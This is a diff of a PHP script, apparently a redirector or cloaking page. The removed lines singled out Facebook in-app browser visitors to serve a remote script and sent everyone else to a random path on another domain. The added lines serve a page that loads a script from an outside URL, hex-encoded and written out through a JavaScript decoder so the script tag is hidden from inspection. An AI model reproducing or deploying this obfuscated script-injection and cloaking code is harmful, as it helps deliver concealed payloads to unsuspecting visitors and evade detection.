@@ -8,28 +8,8 @@ http_response_code(403);
 exit();
 }
 
-
-
-$myString = $_SERVER["HTTP_USER_AGENT"];
-$fbApp = array('FBAN','FBAV','FBMD', 'FBSN', 'FBSV','FBID', 'FBSS', 'FBOP');
-$iphoneMobile = array('iOS', 'iphone', 'iPhone', 'ios');
-$androidMobile = array('android', 'Android');
-
-function strpos_arr($string, $needle) {
-    if(!is_array($needle)) $needle = array($needle);
-    foreach($needle as $what) {
-        if(($pos = strpos($string, $what))!==false) return 'SUCCESS';
-    }
-    return 'FAIL';
-}
-
-if(strpos_arr($myString, $fbApp) == 'SUCCESS'){
-$redi = json_encode($url, JSON_HEX_QUOT|JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS); 
-
-header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-header("Cache-Control: post-check=0, pre-check=0", false);
-header("Pragma: no-cache");
-echo '
+else{
+$contentHTML = '
 <html>
 <head>
 <meta http-equiv="cache-control" content="no-cache">
@@ -42,12 +22,17 @@ echo '
 <script src="'.$url.'" type="text/javascript" async="true"></script>
 </body>
 </html>';
-}
 
+$contentHTMLEXTRAIDO = $contentHTML;	
+$decode =  utf8_decode($contentHTMLEXTRAIDO);
+$hex = bin2hex($decode);	
+$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';
+		
 
-else{
-$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
-header("location: $urlx1", true, 200);
-die();
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache");
+echo $script;
+
 }
 ?>
